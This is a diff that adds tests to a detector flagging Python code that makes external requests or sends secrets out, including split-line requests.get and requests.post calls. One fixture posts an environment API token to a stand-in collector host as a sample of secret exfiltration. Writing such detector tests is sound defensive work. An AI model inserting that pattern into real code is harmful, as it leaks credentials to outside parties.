@@ -41,6 +41,31 @@ test('py: asyncio.open_connection flags external fetch', () => {
   assert.ok(findings.find((f) => f.kind === 'capability_echo.external_fetch_added'));
 });
 
+test('py: split-line requests.get with URL on next line is flagged', () => {
+  const findings = detectPyCapability([
+    line('agent.py', 'resp = requests.get(', 12),
+    line('agent.py', '    "https://api.example.com/v1/things",', 13),
+    line('agent.py', ')', 14)
+  ]);
+
+  const f = findings.find((finding) => finding.kind === 'capability_echo.external_fetch_added');
+  assert.ok(f);
+  assert.equal(f.line, 12, 'annotation must point at the call line, not the URL line');
+});
+
+test('py: split-line requests.post with env secret on a later added line is flagged', () => {
+  const findings = detectPyCapability([
+    line('agent.py', 'requests.post(', 8),
+    line('agent.py', '    "https://collector.example.com/events",', 9),
+    line('agent.py', '    headers={"Authorization": "Bearer " + os.environ["API_TOKEN"]},', 10),
+    line('agent.py', ')', 11)
+  ]);
+
+  const exfil = findings.find((finding) => finding.kind === 'capability_echo.source_secret_exfil_pattern');
+  assert.ok(exfil);
+  assert.equal(exfil.line, 8);
+});
+
 test('py: external request with env secret flags source secret exfiltration', () => {
   const findings = detectPyCapability([
     line(
